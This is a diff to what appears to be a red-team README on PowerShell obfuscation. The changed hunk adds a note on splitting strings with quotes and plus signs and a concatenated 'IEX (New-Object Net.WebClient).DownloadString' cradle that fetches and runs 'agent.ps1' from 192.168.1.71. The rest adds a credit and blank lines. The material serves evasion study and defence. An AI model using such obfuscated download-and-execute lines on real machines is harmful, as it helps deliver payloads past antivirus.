@@ -117,7 +117,9 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
 <br />
 
-      po'+'wer'+'shell.exe IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//19'+'2.16'+'8.1'+'.71/agent.ps1')
+- Using **powershell special caracters: '** and **+**
+
+      power'+'shell.exe IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//19'+'2.16'+'8.1.71/agent.ps1')
 
 ![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
 
@@ -268,13 +270,14 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 <br /><br /><br />
 
 ### Special thanks to:
-**@404death** **@Wandoelmo Silva** **@daniel sauder(avet)**
+**@404death** **@Wandoelmo Silva** **@daniel sauder(avet)** **@Andy Green**
 
 <br />
 
 
 ### Referencies
 https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
+
 
 **Author: r00t-3xp10it**<br />
 **If you know more of this technics, fell free to report them ^_^**<br />
